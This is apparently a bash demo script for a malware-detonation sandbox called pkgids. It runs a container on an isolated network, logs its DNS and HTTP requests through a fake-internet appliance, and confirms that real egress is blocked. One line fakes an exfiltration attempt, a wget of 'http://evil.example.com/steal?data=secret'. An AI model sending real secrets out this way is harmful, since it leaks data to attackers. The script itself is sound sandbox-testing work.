#!/usr/bin/env bash
# demo-fake.sh — show DNS + HTTP capture on detonet, confirm no real egress.
# Run from the project root:  bash scripts/demo-fake.sh
# Or via:                     make demo-fake
#
# Requires: detonet created, pkgids-fakeinternet running.
# Uses Alpine (docker pull alpine if needed).

set -euo pipefail

DETONET="detonet"
FAKEINTERNET_IP="10.200.200.2"
LOGS_DIR="$(cd "$(dirname "$0")/.." && pwd)/logs/fakeinternet"
DEMO_CONTAINER="pkgids-demo-capture"
SEP="─────────────────────────────────────────────────────"

echo ""
echo "$SEP"
echo "  pkgids fake-internet demo"
echo "$SEP"

# Clean up any leftover container from a previous run
docker rm -f "$DEMO_CONTAINER" 2>/dev/null || true

# ── 1. Run demo container ─────────────────────────────────────────────────────
echo ""
echo "[1/3]  Running demo container on detonet ..."

# Run with a fixed --name so we can inspect its IP from the host afterward.
# The container itself does NOT need to report its own IP.
docker run --rm \
  --name    "$DEMO_CONTAINER" \
  --network "$DETONET" \
  --dns     "$FAKEINTERNET_IP" \
  alpine sh -c '
    nslookup evil.example.com >/dev/null 2>&1 || true
    wget -q -O /dev/null "http://evil.example.com/steal?data=secret" 2>/dev/null || true
  ' &
DEMO_PID=$!

# While the container is running, read its IP from the host
DEMO_IP=""
for i in $(seq 1 20); do
  DEMO_IP=$(docker inspect -f \
    '{{.NetworkSettings.Networks.detonet.IPAddress}}' \
    "$DEMO_CONTAINER" 2>/dev/null || true)
  if [[ -n "$DEMO_IP" ]]; then
    break
  fi
  sleep 0.2
done

# Wait for container to finish
wait $DEMO_PID || true

if [[ -z "$DEMO_IP" ]]; then
  echo "  ERROR: could not determine demo container IP on detonet"
  exit 1
fi

echo "    Container IP on detonet: $DEMO_IP"

# Give the appliance a moment to flush its log
sleep 1

# ── 2. Print the capture log ──────────────────────────────────────────────────
echo ""
echo "[2/3]  Capture log: $LOGS_DIR/$DEMO_IP.jsonl"
echo "$SEP"

LOG_FILE="$LOGS_DIR/$DEMO_IP.jsonl"
if [[ -f "$LOG_FILE" ]]; then
  python3 -c "
import json, sys
for line in open('$LOG_FILE'):
    line = line.strip()
    if line:
        print(json.dumps(json.loads(line), indent=2))
"
else
  echo "  (log file not found — check that pkgids-fakeinternet is running)"
fi

echo "$SEP"

# ── 3. Confirm no real egress ─────────────────────────────────────────────────
echo ""
echo "[3/3]  Confirming no real egress (wget to 1.1.1.1 with 3-s timeout) ..."

EGRESS=$(docker run --rm \
  --network "$DETONET" \
  alpine sh -c \
    "wget -q -T 3 http://1.1.1.1/ -O /dev/null 2>&1 && echo OPEN || echo BLOCKED" \
)

if [[ "$EGRESS" == *"BLOCKED"* ]]; then
  echo "    OK — real egress is blocked (expected)."
else
  echo "    WARNING — real egress appears OPEN: $EGRESS"
fi

echo ""
echo "$SEP"
echo "  Demo complete."
echo "$SEP"
echo ""
